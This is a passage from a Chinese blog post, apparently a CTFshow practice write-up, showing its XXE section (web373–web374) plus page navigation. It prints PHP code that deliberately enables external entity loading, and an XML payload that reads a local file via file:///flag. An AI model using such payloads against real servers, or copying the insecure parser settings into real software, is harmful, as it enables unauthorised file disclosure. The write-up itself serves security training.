class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="variable">$dom</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line">    <span class="variable">$dom</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">    <span class="comment"># 允许加载并解析外部实体和 DTD，直接触发 XXE。</span></span><br><span class="line">    <span class="variable">$creds</span> = <span class="title function_ invoke__">simplexml_import_dom</span>(<span class="variable">$dom</span>);</span><br><span class="line">    <span class="variable">$ctfshow</span> = <span class="variable">$creds</span>-&gt;ctfshow;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$ctfshow</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>打开 bp 抓包，修改请求方法，</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE test [                     &lt;!-- 定义 DTD，声明根元素为 test（实际未使用） --&gt;</span><br><span class="line">    &lt;!ENTITY xxe SYSTEM &quot;file:///flag&quot;&gt; </span><br><span class="line">    &lt;!-- 定义一个名为 xxe 的外部实体 file:// 是 URI 协议的一种，表示访问本地文件系统（或网络共享文件） --&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;z3r4y&gt;                             &lt;!-- 实际根元素为 z3r4y（与 DTD 中的 test 不匹配） --&gt;</span><br><span class="line">    &lt;ctfshow&gt;&amp;xxe;&lt;/ctfshow&gt;        &lt;!-- 引用 xxe 实体，尝试读取 /flag 文件 --&gt;</span><br><span class="line">&lt;/z3r4y&gt;</span><br></pre></td></tr></table></figure>

<p>file:&#x2F;&#x2F;&#x2F;flag&#96; 的结构</p>
<ul>
<li><strong>分解</strong>：<ul>
<li><code>file://</code>：协议标识符，表示访问本地文件。</li>
<li><code>/flag</code>：文件路径，表示从根目录开始的绝对路径（Unix&#x2F;Linux 系统）。<ul>
<li><strong>三个斜杠 <code>/</code> 的含义</strong>：<ul>
<li><code>file://</code> 后的第一个 <code>/</code> 是 URI 路径分隔符。</li>
<li>完整的 <code>file:///flag</code> 实际上是 <code>file:// + /flag</code>，即访问根目录下的 <code>flag</code> 文件。</li>
<li>在 Windows 中可能需要写成 <code>file:///C:/flag</code>（注意盘符 <code>C:</code>）。</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
</ul>
<h3 id="web374"><a href="#web374" class="headerlink" title="web374"></a>web374</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">false</span>);</span><br><span class="line"><span class="variable">$xmlfile</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$xmlfile</span>))&#123;</span><br><span class="line">    <span class="variable">$dom</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line">    <span class="variable">$dom</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);    </span><br><span class="line"></span><br></pre></td></tr></table></figure>




    </article>
    <!-- license -->
        <div class="license-wrapper">
            <p>Author：<a href="http://example.com">温柔刀</a>
            <p>Link：<a href="http://example.com/2025/03/26/CTFSHOW%E5%88%B7%E9%A2%98%E6%B1%87%E6%80%BB/">http://example.com/2025/03/26/CTFSHOW%E5%88%B7%E9%A2%98%E6%B1%87%E6%80%BB/</a>
            <p>Publish date：<a href="http://example.com/2025/03/26/CTFSHOW%E5%88%B7%E9%A2%98%E6%B1%87%E6%80%BB/">March 26th 2025, 7:01:01 pm</a>
            <p>Update date：<a href="http://example.com/2025/03/26/CTFSHOW%E5%88%B7%E9%A2%98%E6%B1%87%E6%80%BB/">July 13th 2025, 12:10:11 am</a>
            <p>License：本文采用<a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc/4.0/">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
        </div>
    <!-- paginator -->
    <ul class="post-paginator">
        <li class="next">
                <div class="nextSlogan">Next Post</div>
                <a href="/2025/04/29/%E7%BA%A2%E9%98%9F%E7%AC%94%E8%AE%B0/" title="红队笔记">
                    <div class="nextTitle">红队笔记</div>
                </a>
        </li>
        <li class="previous">
                <div class="prevSlogan">Previous Post</div>
                <a href="/2025/02/26/%E8%87%AA%E5%8A%A8%E5%8C%96%E6%BC%8F%E6%B4%9E%E9%80%9A%E6%8A%A5/" title="自动化漏洞通报">
                    <div class="prevTitle">自动化漏洞通报</div>
                </a>
        </li>
    </ul>
    <!-- comment -->
        <div class="post-comment">
            <!-- 来必力 City 版安装代码 -->

            
            
            
            <!-- utteranc评论 -->

            <!-- partial('_partial/comment/changyan') -->
            <!--PC版-->

            
            
            
        </div>
    <!-- timeliness note -->
    <!-- idea from: https://hexo.fluid-dev.com/posts/hexo-injector/#%E6%96%87%E7%AB%A0%E6%97%B6%E6%95%88%E6%80%A7%E6%8F%90%E7%A4%BA -->
        <script>
            (function () {
                const time = document.getElementsByClassName('post-intro-time')[0]
                const post = document.getElementsByTagName("article")[0]
                if (time === undefined || post === undefined) {
                    return
                }

                const pubTime = new Date(time.innerText)
                const now = Date.now()
                const interval = parseInt(now - pubTime)
                const days = parseInt(interval / 86400000)
                const outdated_threshold = parseInt(180)
                if (interval > outdated_threshold * 24 * 3600 * 1000) {
                    post.innerHTML = '<div class="note note-warning">' +
                    `<div class="title">文章时效性提示</div><p>这是一篇发布于 ${days} 天前的文章，部分信息可能已发生改变，请注意甄别。` +
                    '</p></div>' + post.innerHTML;
                }
            })();
        </script>
    <!-- Mathjax -->
</main>

                <!-- profile -->
            </div>
            <footer class="footer footer-unloaded">
    <!-- social  -->
        <div class="social">
                            <a href="mailto:12345@qq.com" class="iconfont-archer email" title="email" ></a>
                <a href="//github.com/fi3ework" class="iconfont-archer github" target="_blank" title="github"></a>
                <span class="iconfont-archer wechat" title="wechat">
                    <img class="profile-qr" src="/assets/example_qr.png" />
                </span>

        </div>
    <!-- powered by Hexo  -->
    <div class="copyright">
        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
    </div>
    <!-- website approve for Chinese user -->
    <!-- 不蒜子  -->
        <div class="busuanzi-container">
                <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span> :)</span>
        </div>
</footer>

        </div>
        <!-- toc -->
            <div class="toc-wrapper toc-wrapper-loding" style=    top:50vh;
>
                <div class="toc-catalog">
                    <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
                </div>
                <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#WEB-%E5%85%A5%E9%97%A8"><span class="toc-number">1.</span> <span class="toc-text">WEB 入门</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86"><span class="toc-number">1.1.</span> <span class="toc-text">信息搜集</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#web1-17"><span class="toc-number">1.1.1.</span> <span class="toc-text">web1-17</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%88%86%E7%A0%B4"><span class="toc-number">1.2.</span> <span class="toc-text">爆破</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#web18-23"><span class="toc-number">1.2.1.</span> <span class="toc-text">web18-23</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-number">1.3.</span> <span class="toc-text">命令执行</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#web29-%E6%9C%89%E6%B2%A1%E6%87%82%E7%9A%84%E7%9F%A5%E8%AF%86"><span class="toc-number">1.3.1.</span> <span class="toc-text">web29(有没懂的知识)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%83%8C%E6%99%AF%E7%9F%A5%E8%AF%86"><span class="toc-number">1.3.2.</span> <span class="toc-text">背景知识</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%86%E5%88%AB%E4%BB%A5%E5%A6%82%E4%B8%8B%E6%96%B9%E6%B3%95%E5%B0%9D%E8%AF%95%E6%8B%BF%E5%88%B0-flag"><span class="toc-number">1.3.3.</span> <span class="toc-text">分别以如下方法尝试拿到 flag:</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#1%E3%80%81%E7%9B%B4%E6%8E%A5%E6%89%A7%E8%A1%8C%E7%B3%BB%E7%BB%9F%E5%91%BD%E4%BB%A4"><span class="toc-number">1.3.3.1.</span> <span class="toc-text">1、直接执行系统命令</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#2%E3%80%81%E5%86%85%E6%95%9B%E6%89%A7%E8%A1%8C-%EF%BC%88%E5%8F%8D%E5%AD%97%E8%8A%82%E7%AC%A6%EF%BC%89"><span class="toc-number">1.3.3.2.</span> <span class="toc-text">2、内敛执行 （反字节符）</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web31"><span class="toc-number">1.3.4.</span> <span class="toc-text">web31</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web32"><span class="toc-number">1.3.5.</span> <span class="toc-text">web32</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web33-%EF%BC%88%E6%9C%AA%E5%A4%8D%E7%8E%B0%EF%BC%89"><span class="toc-number">1.3.6.</span> <span class="toc-text">web33 （未复现）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web34%EF%BC%88%E6%9C%AA%E5%A4%8D%E7%8E%B0%EF%BC%89"><span class="toc-number">1.3.7.</span> <span class="toc-text">web34（未复现）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web35"><span class="toc-number">1.3.8.</span> <span class="toc-text">web35</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web36"><span class="toc-number">1.3.9.</span> <span class="toc-text">web36</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web37"><span class="toc-number">1.3.10.</span> <span class="toc-text">web37</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web40-%E6%9C%AA"><span class="toc-number">1.3.11.</span> <span class="toc-text">web40(未)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web41-%E6%9C%AA"><span class="toc-number">1.3.12.</span> <span class="toc-text">web41(未)</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web42"><span class="toc-number">1.3.13.</span> <span class="toc-text">web42</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web43"><span class="toc-number">1.3.14.</span> <span class="toc-text">web43</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web48"><span class="toc-number">1.3.15.</span> <span class="toc-text">web48</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web49"><span class="toc-number">1.3.16.</span> <span class="toc-text">web49</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web51"><span class="toc-number">1.3.17.</span> <span class="toc-text">web51</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web52"><span class="toc-number">1.3.18.</span> <span class="toc-text">web52</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web54"><span class="toc-number">1.3.19.</span> <span class="toc-text">web54</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web55"><span class="toc-number">1.3.20.</span> <span class="toc-text">web55</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web56"><span class="toc-number">1.3.21.</span> <span class="toc-text">web56</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB"><span class="toc-number">1.4.</span> <span class="toc-text">文件包含</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#web78"><span class="toc-number">1.4.1.</span> <span class="toc-text">web78</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web79"><span class="toc-number">1.4.2.</span> <span class="toc-text">web79</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web80"><span class="toc-number">1.4.3.</span> <span class="toc-text">web80</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web81"><span class="toc-number">1.4.4.</span> <span class="toc-text">web81</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web82"><span class="toc-number">1.4.5.</span> <span class="toc-text">web82</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web87"><span class="toc-number">1.4.6.</span> <span class="toc-text">web87</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web88"><span class="toc-number">1.4.7.</span> <span class="toc-text">web88</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#PHP%E7%89%B9%E6%80%A7"><span class="toc-number">1.5.</span> <span class="toc-text">PHP特性</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#web89"><span class="toc-number">1.5.1.</span> <span class="toc-text">web89</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web90"><span class="toc-number">1.5.2.</span> <span class="toc-text">web90</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web91"><span class="toc-number">1.5.3.</span> <span class="toc-text">web91</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web93"><span class="toc-number">1.5.4.</span> <span class="toc-text">web93</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web94"><span class="toc-number">1.5.5.</span> <span class="toc-text">web94</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web95"><span class="toc-number">1.5.6.</span> <span class="toc-text">web95</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web96"><span class="toc-number">1.5.7.</span> <span class="toc-text">web96</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web97"><span class="toc-number">1.5.8.</span> <span class="toc-text">web97</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web98%EF%BC%88%E7%9C%8B%E4%B8%8D%E6%87%82%E6%BA%90%E7%A0%81%E7%9C%8B%E4%B8%8D%E6%87%82%E8%A7%A3%E6%9E%90%EF%BC%89"><span class="toc-number">1.5.9.</span> <span class="toc-text">web98（看不懂源码看不懂解析）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web99"><span class="toc-number">1.5.10.</span> <span class="toc-text">web99</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web100"><span class="toc-number">1.5.11.</span> <span class="toc-text">web100</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.6.</span> <span class="toc-text">反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#web254"><span class="toc-number">1.6.1.</span> <span class="toc-text">web254</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#node-js"><span class="toc-number">1.7.</span> <span class="toc-text">node.js</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#web334"><span class="toc-number">1.7.1.</span> <span class="toc-text">web334</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web335"><span class="toc-number">1.7.2.</span> <span class="toc-text">web335</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web336"><span class="toc-number">1.7.3.</span> <span class="toc-text">web336</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web337"><span class="toc-number">1.7.4.</span> <span class="toc-text">web337</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web338"><span class="toc-number">1.7.5.</span> <span class="toc-text">web338</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web339-%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96-query"><span class="toc-number">1.7.6.</span> <span class="toc-text">web339 变量覆盖 query</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web340"><span class="toc-number">1.7.7.</span> <span class="toc-text">web340</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SSRF"><span class="toc-number">1.8.</span> <span class="toc-text">SSRF</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#web351"><span class="toc-number">1.8.1.</span> <span class="toc-text">web351</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web352"><span class="toc-number">1.8.2.</span> <span class="toc-text">web352</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web353"><span class="toc-number">1.8.3.</span> <span class="toc-text">web353</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web354"><span class="toc-number">1.8.4.</span> <span class="toc-text">web354</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web355"><span class="toc-number">1.8.5.</span> <span class="toc-text">web355</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web356"><span class="toc-number">1.8.6.</span> <span class="toc-text">web356</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9C%AA%E5%A4%8D%E7%8E%B0-web357"><span class="toc-number">1.8.7.</span> <span class="toc-text">(未复现)web357</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web358"><span class="toc-number">1.8.8.</span> <span class="toc-text">web358</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#SSTI"><span class="toc-number">1.9.</span> <span class="toc-text">SSTI</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#web361"><span class="toc-number">1.9.1.</span> <span class="toc-text">web361</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web362-%E8%BF%87%E6%BB%A4%E9%83%A8%E5%88%86%E6%95%B0%E5%AD%97"><span class="toc-number">1.9.2.</span> <span class="toc-text">web362 过滤部分数字</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web363-%E5%8D%95%E5%8F%8C%E5%BC%95%E5%8F%B7%E2%80%9D%E2%80%9D%E2%80%98%E2%80%99"><span class="toc-number">1.9.3.</span> <span class="toc-text">web363 单双引号””‘’</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web364-args"><span class="toc-number">1.9.4.</span> <span class="toc-text">web364 args</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web365-%E6%96%B9%E6%8B%AC%E5%8F%B7"><span class="toc-number">1.9.5.</span> <span class="toc-text">web365 方括号[]</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web366-%E4%B8%8B%E5%88%92%E7%BA%BF"><span class="toc-number">1.9.6.</span> <span class="toc-text">web366 下划线_</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web367-os"><span class="toc-number">1.9.7.</span> <span class="toc-text">web367 os</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web368-request"><span class="toc-number">1.9.8.</span> <span class="toc-text">web368 request</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web369-request"><span class="toc-number">1.9.9.</span> <span class="toc-text">web369 request</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XXE"><span class="toc-number">1.10.</span> <span class="toc-text">XXE</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#web373"><span class="toc-number">1.10.1.</span> <span class="toc-text">web373</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#web374"><span class="toc-number">1.10.2.</span> <span class="toc-text">web374</span></a></li></ol></li></ol></li></ol>
            </div>
        <!-- sidebar -->
        <div class="sidebar sidebar-hide">
    <ul class="sidebar-tabs sidebar-tabs-active-0">
        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
    </ul>
    <div class="sidebar-content sidebar-content-show-archive">
        <div class="sidebar-panel-archives">
    <!-- 在 ejs 中将 archive 按照时间排序 -->
        
        
        
        
        
        
        
        
        
    <div class="total-and-search">
        <div class="total-archive">
        Total : 9
        </div>
        <!-- search  -->
    </div>
    <div class="post-archive">
            <div class="archive-year"> 2025 </div>
            <ul class="year-list">
        <li class="archive-post-item">
            <span class="archive-post-date">07/13</span>
            <a class="archive-post-title" href="/2025/07/13/%E5%B0%8F%E5%88%BB%E4%B9%9F%E8%83%BD%E8%AF%BB%E6%87%82%E7%9A%84%E4%BD%86%E5%BE%85%E6%9B%B4%E2%80%94%E2%80%94-NCTF-2023-EvilMQ/">小刻也能读懂的但待更——[NCTF 2023]EvilMQ</a>
        </li>
        <li class="archive-post-item">
            <span class="archive-post-date">07/09</span>
            <a class="archive-post-title" href="/2025/07/09/session-%E4%B8%8E%E6%9D%A1%E4%BB%B6%E7%AB%9E%E4%BA%89%E2%80%94%E2%80%94-HNCTF-2022-QAQ-1inclu4e/">session 与条件竞争——[HNCTF 2022]QAQ_1inclu4e</a>
        </li>
        <li class="archive-post-item">
            <span class="archive-post-date">07/08</span>
            <a class="archive-post-title" href="/2025/07/08/SOME-%E6%94%BB%E5%87%BB%E2%80%94%E2%80%94-HCTF-2017-Deserted-place/">SOME 攻击—— [HCTF 2017]Deserted place</a>
        </li>
        <li class="archive-post-item">
            <span class="archive-post-date">07/08</span>
            <a class="archive-post-title" href="/2025/07/08/PHP-%E5%B8%B8%E8%A7%81%E6%97%A0%E5%8F%82%E5%87%BD%E6%95%B0%E2%80%94%E2%80%94-HNCTF-2022-WEEK2-Canyource/">PHP 常见无参函数—— [HNCTF 2022 WEEK2]Canyource </a>
        </li>
        <li class="archive-post-item">
            <span class="archive-post-date">05/26</span>
            <a class="archive-post-title" href="/2025/05/26/LitCTF-Web%E6%96%B9%E5%90%91%E9%A2%98%E8%A7%A3/">LitCTF-Web方向题解</a>
        </li>
        <li class="archive-post-item">
            <span class="archive-post-date">04/30</span>
            <a class="archive-post-title" href="/2025/04/30/%E5%82%BB%E5%AD%90%E9%83%BD%E8%83%BD%E7%9C%8B%E6%87%82%E7%9A%84SSTI%E5%85%A5%E9%97%A8/">傻子都能看懂的SSTI入门</a>
        </li>
        <li class="archive-post-item">
            <span class="archive-post-date">04/29</span>
            <a class="archive-post-title" href="/2025/04/29/%E7%BA%A2%E9%98%9F%E7%AC%94%E8%AE%B0/">红队笔记</a>
        </li>
        <li class="archive-post-item">
            <span class="archive-post-date">03/26</span>
            <a class="archive-post-title" href="/2025/03/26/CTFSHOW%E5%88%B7%E9%A2%98%E6%B1%87%E6%80%BB/">CTFSHOW 刷题汇总</a>
        </li>
        <li class="archive-post-item">
            <span class="archive-post-date">02/26</span>
            <a class="archive-post-title" href="/2025/02/26/%E8%87%AA%E5%8A%A8%E5%8C%96%E6%BC%8F%E6%B4%9E%E9%80%9A%E6%8A%A5/">自动化漏洞通报</a>
        </li>
            </ul>
    </div>
</div>

        <div class="sidebar-panel-tags">
    <div class="sidebar-tags-name">
            <span class="sidebar-tag-name" data-tags="wp">
                <span class="iconfont-archer">&#xe606;</span>
                wp
            </span>
            <span class="sidebar-tag-name" data-tags="SOME">
                <span class="iconfont-archer">&#xe606;</span>
                SOME
            </span>
            <span class="sidebar-tag-name" data-tags="RCE">
                <span class="iconfont-archer">&#xe606;</span>
                RCE
            </span>
            <span class="sidebar-tag-name" data-tags="WAF绕过">
                <span class="iconfont-archer">&#xe606;</span>
                WAF绕过
            </span>
            <span class="sidebar-tag-name" data-tags="PHP">
                <span class="iconfont-archer">&#xe606;</span>
                PHP
            </span>
            <span class="sidebar-tag-name" data-tags="无参">
                <span class="iconfont-archer">&#xe606;</span>
                无参
            </span>
            <span class="sidebar-tag-name" data-tags="session">
                <span class="iconfont-archer">&#xe606;</span>
                session
            </span>
            <span class="sidebar-tag-name" data-tags="条件竞争">
                <span class="iconfont-archer">&#xe606;</span>
                条件竞争
            </span>
            <span class="sidebar-tag-name" data-tags="SSTI">
                <span class="iconfont-archer">&#xe606;</span>
                SSTI
            </span>
            <span class="sidebar-tag-name" data-tags="Java">
                <span class="iconfont-archer">&#xe606;</span>
                Java
            </span>
            <span class="sidebar-tag-name" data-tags="笔记">
                <span class="iconfont-archer">&#xe606;</span>
                笔记
            </span>
    </div>
    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
        缺失模块，请参考主题文档进行安装配置：https://github.com/fi3ework/hexo-theme-archer#%E5%AE%89%E8%A3%85%E4%B8%BB%E9%A2%98
    </div> 
    <div class="sidebar-tags-list"></div>
</div>

        <div class="sidebar-panel-categories">
    <div class="sidebar-categories-name">
    </div>
    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
    <div class="sidebar-categories-list"></div>
</div>

    </div>
</div>

        <!-- site-meta -->
        <script>
    var siteMetaRoot = "/"
    if (siteMetaRoot === "undefined") {
        siteMetaRoot = '/'
    }
    var siteMeta = {
        url: "http://example.com",
        root: siteMetaRoot,
        author: "温柔刀"
    }
</script>

        <!-- import experimental options here -->
        <!-- Custom Font -->

        <!-- main func -->
        <script src="/scripts/main.js"></script>
        <!-- fancybox -->
        <script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.36/dist/fancybox/fancybox.umd.js" onload="window.Fancybox.bind('[data-fancybox]')" defer></script>
        <!-- algolia -->
        <!-- busuanzi -->
            <script src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" async></script>
        <!-- async load share.js -->
            <script src="/scripts/share.js" async></script>
        <!-- mermaid -->
    </body>
</html>
